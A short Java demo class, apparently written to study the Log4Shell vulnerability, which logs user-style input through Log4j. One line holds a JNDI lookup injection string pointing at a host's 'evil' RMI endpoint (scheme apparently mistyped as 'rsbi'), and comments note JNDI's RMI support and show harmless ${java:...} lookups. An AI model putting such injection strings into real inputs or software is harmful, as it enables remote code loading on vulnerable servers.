package com.fullstackboy;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * TODO Liuyongfei
 *
 * @author Liuyongfei
 * @date 2021/12/17 10:06
 */
public class TestController {

    private static final Logger logger = LogManager.getLogger(TestController.class);
    public static void main(String[] args) {

        //        String name = "xiaoliu";
//        String name = "${java:os}"; // // Hello, Mac OS X 10.12.6 unknown, architecture: x86_64-64
//        String name = "${java:vm}"; // // Hello, Mac OS X 10.12.6 unknown, architecture: x86_64-64

        // 比较致命的漏洞
        // look up 基于 jndi，而jndi又支持rmi
        String name = "${jndi:rsbi://192.168.65.131:1099/evil}";

        logger.info("Hello, {}", name);

    }
}
